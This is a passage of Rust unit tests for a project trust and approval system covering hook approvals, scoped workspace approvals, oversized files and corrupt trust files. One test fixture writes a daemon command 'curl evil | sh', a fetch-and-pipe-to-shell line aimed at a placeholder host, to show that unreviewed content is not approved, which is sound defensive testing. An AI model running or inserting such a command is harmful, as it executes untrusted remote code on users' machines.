            TrustState::Trusted
        );
        assert!(matches!(
            state_in(dir.path(), &project_b).unwrap(),
            TrustState::Untrusted { .. }
        ));
    }

    #[test]
    fn concurrent_approvals_do_not_lose_updates() {
        let dir = tempfile::tempdir().unwrap();
        let projects: Vec<_> = (0..8).map(|_| with_hooks(&["make"])).collect();
        std::thread::scope(|scope| {
            for (_, project) in &projects {
                scope.spawn(|| approve_in(dir.path(), project).unwrap());
            }
        });
        for (_, project) in &projects {
            assert_eq!(state_in(dir.path(), project).unwrap(), TrustState::Trusted);
        }
    }

    #[test]
    fn an_operations_approval_covers_only_the_scope_it_was_made_for() {
        let dir = tempfile::tempdir().unwrap();
        let (t, _) = with_hooks(&[]);
        let project = reopen(&t, "[hooks]\nsetup = [\"bun install\"]", "");
        let verdict = |approval: Option<&Approval>, at: &Path| {
            verdict_in(dir.path(), &project, at, approval).unwrap()
        };
        let reviewed = scope(&project);
        let approval = Approval::of(&reviewed);
        assert_eq!(approval.digest(), reviewed.digest);
        assert_eq!(verdict(None, &t.root), Verdict::NotApproved);
        assert_eq!(verdict(Some(&approval), &t.root), Verdict::Approved);

        // A workspace whose pitchfork files differ from what was reviewed: the
        // approval is of something else, and nothing else approves it.
        let other = tempfile::tempdir().unwrap();
        std::fs::write(
            other.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"curl evil | sh\"\n",
        )
        .unwrap();
        assert_eq!(verdict(Some(&approval), other.path()), Verdict::Differs);
        assert_eq!(verdict(None, other.path()), Verdict::NotApproved);
        assert!(!Verdict::Differs.approved() && !Verdict::NotApproved.approved());

        // The reviewed scope of that workspace is covered by its own approval,
        // which is never stored.
        let own = Approval::of(&scope_at(&project, other.path()));
        assert_eq!(verdict(Some(&own), other.path()), Verdict::Approved);
        assert_eq!(verdict(Some(&own), &t.root), Verdict::Differs);
        assert!(!dir.path().join("trust.toml").exists(), "nothing stored");

        // An approval on record for the workspace's content wins over a
        // mismatching one: nothing is refused that was approved before.
        approve_scope_in(
            dir.path(),
            &project,
            other.path(),
            &scope_at(&project, other.path()),
        )
        .unwrap();
        assert_eq!(verdict(Some(&approval), other.path()), Verdict::Approved);
        assert_eq!(verdict(None, other.path()), Verdict::Approved);
    }

    #[test]
    fn an_approval_never_covers_a_file_too_large_to_hash() {
        use crate::pitchfork_scope::Layer;
        let (t, _) = with_hooks(&["make"]);
        let mut huge = scope(&t.project);
        let approval = Approval::of(&huge);
        assert!(approval.covers(&huge));
        huge.processes.layers.push(Layer {
            file: "pitchfork.toml".into(),
            daemons: Vec::new(),
            shared: Default::default(),
            problem: Some("is larger than 256 MiB and cannot be approved".into()),
            sha256: None,
            unbound: true,
        });
        assert!(!approval.covers(&huge));
    }

    #[test]
    fn corrupt_files_are_reported_not_ignored() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("trust.toml"), "approval = 3").unwrap();
        let (_t, project) = with_hooks(&["make"]);
        assert!(state_in(dir.path(), &project).is_err());
    }
}
